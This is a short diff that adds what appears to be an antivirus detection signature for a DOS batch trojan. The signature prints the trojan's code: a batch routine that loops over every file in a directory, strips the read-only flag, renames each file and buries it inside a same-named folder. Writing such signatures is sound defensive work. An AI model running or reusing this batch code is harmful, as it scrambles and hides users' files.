@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36609
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ctty nul if %1==" goto hold attrib -r %1 ren %1 hold.pc md %1 move hold.pc %1\ ren %1\hold.pc %1\%1 goto endhold :hold for %%n in(*?.*) do call %0 %%n :endhold 
